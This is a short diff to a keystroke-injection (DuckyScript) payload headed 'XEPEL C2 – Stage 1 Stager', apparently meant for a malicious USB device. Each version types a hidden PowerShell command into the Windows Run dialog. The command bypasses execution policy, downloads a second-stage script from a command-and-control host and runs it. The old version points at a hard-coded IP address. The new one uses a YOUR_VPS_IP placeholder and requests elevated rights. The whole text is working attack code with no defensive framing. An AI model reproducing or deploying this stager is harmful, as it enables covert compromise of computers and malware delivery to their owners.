@@ -1,9 +1,8 @@
 REM XEPEL C2 – Stage 1 Stager
-REM Fits comfortably in Windows Run dialog
-REM No multiline, no focus issues
+REM cmd /c wrapper fixes Run dialog permission error
 
 DELAY 2000
 GUI r
-DELAY 1000
-STRING powershell -w hidden -ep bypass -c "iwr -Uri http://153.75.82.198/stage2.ps1 -OutFile $env:TEMP\x.ps1; Start-Process $env:TEMP\x.ps1"
+DELAY 1500
+STRING cmd /c powershell -w hidden -ep bypass -c "iwr -Uri 'http://YOUR_VPS_IP/stage2.ps1' -OutFile '$env:TEMP\s.ps1'; Start-Process powershell -ArgumentList '-w hidden -ep bypass -f $env:TEMP\s.ps1' -Verb RunAs"
 ENTER
